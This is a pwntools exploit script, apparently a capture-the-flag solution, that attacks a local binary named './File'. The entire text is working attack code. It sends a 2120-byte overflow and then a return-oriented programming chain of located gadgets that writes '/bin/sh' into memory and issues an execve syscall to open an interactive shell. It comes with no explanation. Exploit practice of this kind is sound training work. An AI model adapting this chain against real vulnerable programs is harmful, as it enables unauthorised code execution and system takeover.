from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF("./File")
p = process(["./File"])
p.recv(1024)
rop = ROP(e)


# Find gadgets
retgadget = rop.find_gadget(["ret"]).address
poprdigadget = rop.find_gadget(["pop rdi", "ret"]).address
popraxgadget = rop.find_gadget(["pop rax", "ret"]).address
poprdxgadget = rop.find_gadget(["pop rdx", "ret"]).address
poprsigadget = rop.find_gadget(["pop rsi", "ret"]).address
syscallgadget = rop.find_gadget(["syscall"]).address
mwritegadget = 0x401ab3  
rwmemory = 0x4ab9aa 
payload = b"A" * 2120
payload += p64(retgadget)               # avoid movaps issue
payload += p64(poprdigadget)        
payload += p64(rwmemory)              
payload += p64(popraxgadget)            
payload += b"/bin/sh\x00"              
payload += p64(mwritegadget)           
payload += p64(poprsigadget)            
payload += p64(0x0)
payload += p64(poprdxgadget)           
payload += p64(0x0)
payload += p64(popraxgadget)            
payload += p64(0x3b)
payload += p64(syscallgadget)
p.sendline(payload)
p.interactive()







